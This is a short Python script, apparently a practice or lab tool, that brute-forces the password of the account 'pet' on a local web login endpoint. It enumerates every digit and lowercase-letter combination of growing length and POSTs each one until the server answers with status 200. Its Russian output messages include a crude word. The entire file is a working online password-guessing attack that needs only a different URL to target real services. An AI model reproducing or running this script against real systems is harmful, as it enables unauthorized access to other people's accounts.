import requests

state = 0
digits_count = 0
ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz"


def indexing():
    global state, digits_count
    base = len(ALPHABET)
    result = ""

    n = state
    while len(result) < digits_count:
        rest = n % base
        result = ALPHABET[rest] + result
        n = n // base

    if all(char == ALPHABET[-1] for char in result):
        state = 0
        digits_count += 1
    else:
        state += 1

    return result


password = ''
login = "pet"

while True:
    password = indexing()
    data = {"login": login, "password": password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print(f"Логин = {login} | Пароль = {password}, объебано")
        break
    else:
        print(f" Пароль {password} не подошел ")
